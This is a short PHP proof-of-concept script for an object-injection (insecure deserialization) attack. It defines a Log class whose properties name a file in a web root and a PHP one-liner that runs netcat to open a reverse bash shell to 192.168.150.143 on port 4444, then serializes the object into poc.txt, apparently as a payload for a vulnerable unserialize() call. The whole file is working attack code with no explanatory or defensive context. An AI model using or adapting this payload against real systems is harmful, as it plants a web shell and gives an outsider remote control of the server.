<?php

class Log{
	public $filename = "/var/www/html/scriptz/shell6.php";
	public $data = "<?php system('nc -e /bin/bash 192.168.150.143 4444');?>";
}

$poc = new Log;

$serialize_poc = serialize($poc);

$file = fopen("./poc.txt","w");
fwrite($file, $serialize_poc);

?>
